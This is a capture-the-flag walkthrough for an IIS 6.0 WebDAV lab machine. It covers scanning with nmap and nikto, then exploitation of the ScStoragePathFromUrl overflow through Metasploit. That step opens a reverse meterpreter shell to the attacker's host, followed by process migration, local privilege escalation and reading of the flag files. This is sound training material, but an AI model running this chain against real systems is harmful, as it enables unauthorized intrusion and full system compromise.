# Machine Info
**IP**: 10.10.10.14

**OS**: Windows

**Difficulty**: Easy

# Passive Enumeration:

## **nmap**
```
The open services were enumerated using nmap as below to start the assessment.
$ nmap -T4 -p- 10.10.10.14                      
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-04 22:26 EDT
Nmap scan report for 10.10.10.14
Host is up (0.027s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 102.70 seconds

$ sudo nmap -T4 -p80 -A -O 10.10.10.14           
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-04 22:30 EDT
Nmap scan report for 10.10.10.14
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Sat, 05 Jun 2021 02:35:13 GMT
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|media device
Running (JUST GUESSING): Microsoft Windows 2000|XP|2003|PocketPC/CE (94%), BT embedded (85%)
OS CPE: cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp::sp1:professional cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_ce:5.0.1400 cpe:/h:btvision:btvision%2b_box
Aggressive OS guesses: Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (94%), Microsoft Windows Server 2003 SP1 (93%), Microsoft Windows Server 2003 SP1 or SP2 (93%), Microsoft Windows Server 2003 SP2 (93%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows 2000 SP3/SP4 or Windows XP SP1/SP2 (90%), Microsoft Windows 2000 SP4 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP1 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   73.44 ms 10.10.16.1
2   73.42 ms 10.10.10.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds
```

## **Enumerating port 80**
Visiting the website on a browser, we find a banner saying the page is under construction. 



Wappalyzer shows that the website is running on an IIS 6.0 server and using .net framework.

The same is confirmed using whatweb as well.
$ whatweb http://10.10.10.14/                                                                                                                                      1 ⚙
http://10.10.10.14/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/6.0], IP[10.10.10.14], Microsoft-IIS[6.0][Under Construction], MicrosoftOfficeWebServer[5.0_Pub], UncommonHeaders[microsoftofficewebserver], X-Powered-By[ASP.NET]
Finally, running a nikto scan against the website throws up the following possible vulnerabilities.
$ nikto -h http://10.10.10.14/                                                                                                                               130 ⨯ 1 ⚙
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.14
+ Target Hostname:    10.10.10.14
+ Target Port:        80
+ Start Time:         2021-06-04 22:37:34 (GMT-4)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (COPY MKCOL UNLOCK PROPPATCH SEARCH PROPFIND LOCK listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://10.10.10.14/
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ 8015 requests: 0 error(s) and 27 item(s) reported on remote host
+ End Time:           2021-06-04 22:53:46 (GMT-4) (972 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

WebDAV, or Web-Based Distributed Authoring and Versioning, seems interesting. It is used to manage files on remote servers and we can see that various methods are allowed. Enumerating it further using davtest, however, reveals nothing.
$ davtest -url http://10.10.10.14/                                                                                                                                 1 ⚙
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.14
********************************************************
NOTE	Random string for this session: oq0MH4B
********************************************************
 Creating directory
MKCOL		FAIL
********************************************************
 Sending test files
PUT	php	FAIL
PUT	asp	FAIL
PUT	cfm	FAIL
PUT	txt	FAIL
PUT	jhtml	FAIL
PUT	jsp	FAIL
PUT	pl	FAIL
PUT	html	FAIL
PUT	shtml	FAIL
PUT	aspx	FAIL
PUT	cgi	FAIL

********************************************************
/usr/bin/davtest Summary:

Vulnerability:
Searching for WebDAV and IIS 6 related vulnerabilities brings up a metasploit module for Microsoft IIS WebDav ScStoragePathFromUrl Overflow (https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/)  and an exploitDB script (https://www.exploit-db.com/exploits/41738). Searchsploit query for webdav and IIS 6 also identifies the same vulnerability.
$ searchsploit webdav IIS 6                                                                                                                                        1 ⚙
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS - WebDAV Write Access Code Execution (Metasploit)                                                                        | windows/remote/16471.rb
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (1)                                             | windows/remote/22365.pl
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (2)                                             | windows/remote/22366.c
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (3)                                             | windows/remote/22367.txt
Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV 'ntdll.dll' Remote Buffer Overflow (4)                                             | windows/remote/22368.txt
Microsoft IIS 5.0 - WebDAV 'ntdll.dll' Path Overflow (MS03-007) (Metasploit)                                                           | windows/remote/16470.rb
Microsoft IIS 5.0 - WebDAV Denial of Service                                                                                           | windows/dos/20664.pl
Microsoft IIS 5.0 - WebDAV PROPFIND / SEARCH Method Denial of Service                                                                  | windows/dos/22670.c
Microsoft IIS 5.1 - WebDAV HTTP Request Source Code Disclosure                                                                         | windows/remote/26230.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                               | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                                                | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                            | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                            | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                        | windows/remote/8754.patch
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

Exploitation using Metasploit:
Launching msfconsole, we quickly set up the options and trigger the exploit to get a shell with NETWORK user privilege.
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.16.173:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175174 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.16.173:4444 -> 10.10.10.14:1037) at 2021-06-05 11:20:03 -0400

meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
However, the shell spawned by metasploit is unstable and getuid fails to execute. Using ps, we can see that the "w3wp.exe" process is running with the same privilege level and migrating to the process ID makes the shell stable.
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 180   1076  cidaemon.exe
 224   1076  cidaemon.exe
 276   4     smss.exe
 324   276   csrss.exe
 328   584   davcdata.exe
 348   276   winlogon.exe
 396   348   services.exe
 408   348   lsass.exe
 584   396   svchost.exe
 680   396   svchost.exe
 740   396   svchost.exe
 772   396   svchost.exe
 800   396   svchost.exe
 936   396   spoolsv.exe
 964   396   msdtc.exe
 1076  396   cisvc.exe
 1120  396   svchost.exe
 1180  396   inetinfo.exe
 1216  396   svchost.exe
 1328  396   VGAuthService.exe
 1408  396   vmtoolsd.exe
 1456  396   svchost.exe
 1636  396   alg.exe
 1668  396   svchost.exe
 1764  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1880  1456  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 1916  396   dllhost.exe
 2268  348   logon.scr
 2300  584   wmiprvse.exe
 2456  584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2636  1456  w3wp.exe
 3064  1880  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 4056  1076  cidaemon.exe

meterpreter > migrate 1880
[*] Migrating from 3064 to 1880...
[*] Migration completed successfully.
meterpreter > getuid 
Server username: NT AUTHORITY\NETWORK SERVICE
Privilege Escalation:
With the current privilege level, we cannot access the user or administrator details.
meterpreter > cd Documents\ and\ Settings 
meterpreter > ls
Listing: c:\Documents and Settings
==================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2017-04-12 10:12:15 -0400  Administrator
40777/rwxrwxrwx  0     dir   2017-04-12 09:42:38 -0400  All Users
40777/rwxrwxrwx  0     dir   2017-04-12 09:42:38 -0400  Default User
40777/rwxrwxrwx  0     dir   2017-04-12 10:32:01 -0400  Harry
40777/rwxrwxrwx  0     dir   2017-04-12 10:08:32 -0400  LocalService
40777/rwxrwxrwx  0     dir   2017-04-12 10:08:31 -0400  NetworkService

meterpreter > cd Harry 
[-] stdapi_fs_chdir: Operation failed: Access is denied.
To elevate privilege, we need to check for local vulnerabilities that can be exploited. The local_exploit_suggester module comes in handy in such scenarios. All we need to do is keep the open session in the background and run the module with the "session" option set to the session id.
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > options 

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf6 post(multi/recon/local_exploit_suggester) > exploit 

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 38 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
The "exploit/windows/local/ms10_015_kitrap0d", "exploit/windows/local/ms14_058_track_popup_menu", and "exploit/windows/local/ppr_flatten_rec" modules provide a shell with administrator privilege.
Post-Exploitation:
The Desktop folder inside the user and administrator directories contains the user and root flags.
meterpreter > cd Documents\ and\ Settings 
meterpreter > ls
Listing: c:\Documents and Settings
==================================

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40777/rwxrwxrwx  0     dir   2017-04-12 10:12:15 -0400  Administrator
40777/rwxrwxrwx  0     dir   2017-04-12 09:42:38 -0400  All Users
40777/rwxrwxrwx  0     dir   2017-04-12 09:42:38 -0400  Default User
40777/rwxrwxrwx  0     dir   2017-04-12 10:32:01 -0400  Harry
40777/rwxrwxrwx  0     dir   2017-04-12 10:08:32 -0400  LocalService
40777/rwxrwxrwx  0     dir   2017-04-12 10:08:31 -0400  NetworkService

meterpreter > cd Harry 
meterpreter > cd Desktop 
meterpreter > cat user.txt 
bd****************************69
meterpreter > cd ../..
meterpreter > cd Administrator 
meterpreter > cd Desktop 
meterpreter > cat root.txt 
93****************************7b